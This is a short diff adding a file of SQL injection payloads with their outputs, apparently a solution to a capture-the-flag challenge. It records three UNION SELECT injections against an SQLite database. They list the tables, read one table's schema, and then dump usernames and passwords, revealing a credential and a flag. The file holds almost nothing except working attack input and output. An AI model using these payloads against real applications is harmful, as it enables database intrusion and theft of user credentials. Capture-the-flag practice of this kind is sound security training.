@@ -1,0 +1,9 @@
+'union+select+'superman','company',group_concat(name) from sqlite_master where type='table'--
+output => users133337,speakers
+
+'union SELECT 'superman','company',sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users133337'--
+output => CREATE TABLE users133337 (id integer, username666666 text, password1111111 text)
+
+'union SELECT 'superman',username666666,password1111111 FROM users133337--
+output => aria:koukouvakoukouvakoukouvakoukouvakoukouvakoukouva
+flag{m4nual_N3ver_fails_352dASDD}
